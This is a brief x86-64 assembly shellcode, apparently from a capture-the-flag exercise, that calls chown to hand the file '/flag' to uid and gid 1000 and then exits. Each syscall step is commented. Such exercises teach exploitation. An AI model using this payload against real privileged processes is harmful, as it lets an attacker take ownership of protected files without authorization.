.global _start
.intel_syntax noprefix
_start:
	mov rbx, 0x00000000067616c662f
	push rbx
	mov rax, 92				# syscall number of chown
	mov rdi, rsp				# point the first argument at stack (where we have "/flag")
	mov rsi, 1000				# new uid 1000
	mov rdx, 1000				# new group id 1000
	syscall				        # trigger chown("/flag", 1000, 1000)
	mov rax, 60				# syscall number of exit
	syscall				        # trigger exit()


